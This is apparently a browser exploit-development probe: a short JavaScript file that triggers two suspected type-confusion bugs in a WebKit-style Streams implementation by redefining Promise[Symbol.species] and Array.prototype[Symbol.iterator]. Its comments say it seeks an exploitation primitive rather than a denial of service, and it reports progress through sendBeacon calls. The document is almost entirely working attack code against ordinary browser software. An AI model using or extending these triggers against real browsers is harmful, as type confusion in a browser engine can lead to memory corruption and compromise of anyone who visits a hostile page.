// c023: two Streams type-confusion candidates, straight from their regression tests.
//
// Neither is a crash-in-passing bug: both make C++ cast a JS object of the wrong type, which is the shape that
// yields a primitive rather than a DoS. Both are tiny and allocate almost nothing, so they cannot OOM the
// WebProcess the way c020 did.
//
// A. ReadableStream pipeTo + Promise[Symbol.species]: the cancel callback swaps in a fake constructor whose
//    construct() returns 0. The C++ side then performs jsCast<JSPromise*> on it and calls @then on the result.
// B. TransformStream with Array.prototype[Symbol.iterator] poisoned: createInternalTransformStreamFromTransformer
//    returns a 3-element array that C++ converts with IDLSequence<IDLObject>, so the stream slots can be filled
//    with arbitrary JS objects that are then treated as JSReadableStream/JSWritableStream.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c023-' + t); } catch (e) {} }
  send('boot');

  // --- A ---
  send('A-start');
  try {
    function FakePromise(executor) {
      executor(function () {}, function () {}); // satisfy resolve/reject callability checks
      return 0;
    }
    var readableStream = new ReadableStream({
      cancel: function (reason) {
        var didCall = false;
        Object.defineProperty(Promise, Symbol.species, {
          configurable: true,
          get: function () {
            if (!didCall) { didCall = true; return FakePromise; }
            return undefined;
          }
        });
        return new Promise(function () {});
      }
    });
    var writableStream = new WritableStream();
    var writer = writableStream.getWriter();
    writer.close();
    writer.releaseLock();
    readableStream.pipeTo(writableStream).catch(function () {});
    send('A-survived');
  } catch (e) { send('A-threw:' + e.name); }

  // --- B ---
  send('B-start');
  try {
    var originalIterator = Array.prototype[Symbol.iterator];
    var evil = {
      next: function () {
        return { value: { evil: 1 }, done: false };   // wrong-type objects in the stream slots
      }
    };
    Array.prototype[Symbol.iterator] = function () { return evil; };
    try {
      var ts = new TransformStream({ transform: function (c, ctl) { ctl.enqueue(c); } });
      send('B-built');
    } finally {
      Array.prototype[Symbol.iterator] = originalIterator;
    }
    send('B-survived');
  } catch (e) {
    try { Array.prototype[Symbol.iterator] = Array.prototype[Symbol.iterator]; } catch (e2) {}
    send('B-threw:' + e.name);
  }

  send('done');
})();
